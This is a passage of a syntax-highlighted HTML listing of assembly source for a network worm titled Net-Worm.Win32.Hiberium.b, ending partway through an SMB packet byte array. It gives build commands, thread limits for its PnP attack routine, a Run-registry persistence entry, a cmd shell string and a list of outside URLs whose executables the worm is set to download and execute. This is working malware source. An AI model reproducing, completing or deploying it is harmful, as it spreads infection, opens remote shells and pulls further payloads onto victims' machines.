<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Win32.Hiberium.b - PnP.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">CPU</span><span class="sc0"> </span><span class="sc2">386</span><span class="sc0">
</span><span class="sc4">[</span><span class="sc9">BITS</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;To compile:</span><span class="sc0">
</span><span class="sc1">;nasmw -O6 -fwin32 PnP.asm</span><span class="sc0">
</span><span class="sc1">;link /RELEASE /entry:entry /subsystem:windows PnP.obj [libs]</span><span class="sc0">


</span><span class="sc5">SCAN_THREADS</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">MAX_THREADS</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">  </span><span class="sc1">;only @AttackPnP threads</span><span class="sc0">
</span><span class="sc5">TIMEOUT</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">
</span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">  </span><span class="sc1">;seconds</span><span class="sc0">
</span><span class="sc5">STACK_SIZE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x3000</span><span class="sc0">  </span><span class="sc1">;only @AttackPnP threads</span><span class="sc0">
</span><span class="sc5">FL_EXECUTE_URL</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FL_NOEXEC_URL</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">



</span><span class="sc9">%macro</span><span class="sc0">  </span><span class="sc5">API</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">%xdefine</span><span class="sc0">    </span><span class="sc10">%1</span><span class="sc0">  </span><span class="sc5">_</span><span class="sc10">%1</span><span class="sc5">@</span><span class="sc10">%2</span><span class="sc0">
    </span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc10">%1</span><span class="sc0">
</span><span class="sc9">%endmacro</span><span class="sc0">

</span><span class="sc9">%macro</span><span class="sc0">  </span><span class="sc5">API</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">%xdefine</span><span class="sc0">    </span><span class="sc10">%1</span><span class="sc0">  </span><span class="sc5">_</span><span class="sc10">%3</span><span class="sc5">@</span><span class="sc10">%2</span><span class="sc0">
    </span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc10">%1</span><span class="sc0">
</span><span class="sc9">%endmacro</span><span class="sc0">



</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0">              </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">InternetGetConnectedState</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetCurrentThreadId</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">WaitForSingleObject</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">CreateMutex</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateMutexA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">ReleaseMutex</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">InitializeCriticalSection</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">EnterCriticalSection</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">LeaveCriticalSection</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">lstrlenA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc2">28</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc2">24</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">CreateProcess</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetModuleHandle</span><span class="sc4">,</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">LoadLibraryA</span><span class="sc0">    
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">,</span><span class="sc0">           </span><span class="sc2">20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">RegSetValueEx</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc2">24</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">RegCloseKey</span><span class="sc0">


</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc4">,</span><span class="sc0">             </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">ioctlsocket</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">bind</span><span class="sc4">,</span><span class="sc0">               </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">listen</span><span class="sc4">,</span><span class="sc0">             </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">accept</span><span class="sc4">,</span><span class="sc0">             </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">select</span><span class="sc4">,</span><span class="sc0">             </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">getpeername</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">getsockname</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">gethostname</span><span class="sc4">,</span><span class="sc0">            </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">inet_ntoa</span><span class="sc4">,</span><span class="sc0">          </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">,</span><span class="sc0">               </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc4">,</span><span class="sc0">               </span><span class="sc2">16</span><span class="sc0">


</span><span class="sc9">%xdefine</span><span class="sc0">    </span><span class="sc5">wsprintf</span><span class="sc0">    </span><span class="sc5">_wsprintfA</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">      </span><span class="sc5">wsprintf</span><span class="sc0">

</span><span class="sc9">%xdefine</span><span class="sc0">    </span><span class="sc5">memcpy</span><span class="sc0">      </span><span class="sc5">_memcpy</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">      </span><span class="sc5">memcpy</span><span class="sc0">



</span><span class="sc5">SOCK_STREAM</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SOCK_DGRAM</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">IPPROTO_UDP</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">SOMAXCONN</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x7fffffff</span><span class="sc0">

</span><span class="sc5">ERROR_ALREADY_EXISTS</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">183</span><span class="sc0">
</span><span class="sc5">FIONBIO</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x8004667e</span><span class="sc0">
</span><span class="sc5">KEY_WRITE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x20006</span><span class="sc0"> 
</span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x80000002</span><span class="sc0">
</span><span class="sc5">REG_SZ</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x80000000</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0x40000000</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">


</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.bss</span><span class="sc0">

</span><span class="sc5">CONNECTED</span><span class="sc0">   </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">THREADNUM</span><span class="sc0">   </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;&lt;--|</span><span class="sc0">
</span><span class="sc5">OSVERSION</span><span class="sc0">   </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CS_THREADNUM</span><span class="sc0">    </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">CS_LOOP</span><span class="sc0">     </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">MTX_CBACK</span><span class="sc0">   </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">dwLocalIPs</span><span class="sc0">  </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">lpLocalIPs</span><span class="sc0">  </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc5">SCAN_THREADS</span><span class="sc0">
</span><span class="sc5">WSADATA_LEN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">400</span><span class="sc0">
</span><span class="sc5">WSADATA</span><span class="sc0">     </span><span class="sc9">resb</span><span class="sc0">    </span><span class="sc5">WSADATA_LEN</span><span class="sc0">
</span><span class="sc5">dwFileSize</span><span class="sc0">  </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">dwFilePointer</span><span class="sc0">   </span><span class="sc9">resd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">dwFileNameLen</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
</span><span class="sc5">szFileName</span><span class="sc0">  </span><span class="sc9">resb</span><span class="sc0">    </span><span class="sc5">dwFileNameLen</span><span class="sc0">
</span><span class="sc5">HTTP_BUFFER_LEN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">HTTP_BUFFER</span><span class="sc0"> </span><span class="sc9">resb</span><span class="sc0">    </span><span class="sc5">HTTP_BUFFER_LEN</span><span class="sc0">



</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc5">.rdata</span><span class="sc0">

</span><span class="sc5">STR_IPC</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'\\%s\IPC$'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMutexName</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'Hiberium'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szStartupKey</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szStartupValue</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'MSPRO32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STR_WS2_32</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'WS2_32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STR_WSASocket</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'WSASocketA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STR_CMD</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'cmd'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">HTTP_FMT</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'GET %s HTTP/1.1'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'Host: %s'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'Connection: close'</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">URLS</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'strtt.interfree.it/VfProtect.exe'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">FL_EXECUTE_URL</span><span class="sc4">,</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'strtt.interfree.it/Hiberium.rar'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">FL_NOEXEC_URL</span><span class="sc4">,</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'utenti.lycos.it/strtt/VfProtect2.exe'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">FL_EXECUTE_URL</span><span class="sc4">,</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'utenti.lycos.it/strtt/Hiberium2.rar'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">FL_NOEXEC_URL</span><span class="sc4">,</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;end of urls</span><span class="sc0">


</span><span class="sc5">SMB_Negotiate</span><span class="sc0">   \
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x85</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x42</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x72</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x53</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xC8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x43</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x45</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x54</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x52</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x50</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x52</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x47</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x52</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4C</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4D</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x41</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x4E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x31</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x2E</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x02</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x69</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6E</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x64</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x77</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x73</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x66</span><span class="sc4">,</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x72</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x57</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x72</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6B</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x67</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x72</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x6F</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x75</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x70</span><span class="sc4">,</span><span class="sc0">
